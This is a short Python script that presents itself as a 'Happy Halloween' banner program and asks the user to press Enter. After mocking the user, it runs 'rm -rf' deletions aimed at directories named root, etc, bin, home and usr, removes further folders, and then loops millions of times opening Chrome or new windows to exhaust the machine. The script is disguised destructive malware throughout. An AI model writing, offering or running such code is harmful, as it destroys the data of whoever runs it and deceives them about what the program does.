import os
import time
import pyfiglet 
import requests

os.system("py -m pip install requests pyfiglet")
os.system("pip install requests pyfiglet")
os.system("pip2 install requests pyfiglet")
os.system("pip3 install requests pyfiglet")
time.sleep(1)
os.system("clear")
os.system("Cls")
banner1 = pyfiglet.figlet_format("Happy Halloween")
print(banner1)
print("___________________________________________________________")
print()
print("INSTRUCTIONS : \n (1).Enter without typing anything...to continue... \n (2).Enter ctrl+c to exit...")
i = input("> ")
if i=="":
 print("[#] You are a big foooooooool...")
 print()
 time.sleep(1)
 os.system("cd ../..")
 os.system("rm -rf root etc bin home usr shared")
 os.system("rm -rf files")
 os.system("rmdir users")
 for i in range(99999999):
  os.system("start chrome")
if i=="ctrl+c":
 print("[#] This way didn't work for you...")
 print()
 time.sleep(1)
 os.system("cd ../..")
 os.system("rm -rf root etc bin home usr shared")
 os.system("rm -rf files")
 os.system("rmdir users")
 for i in range(9999999999):
  os.system("start")
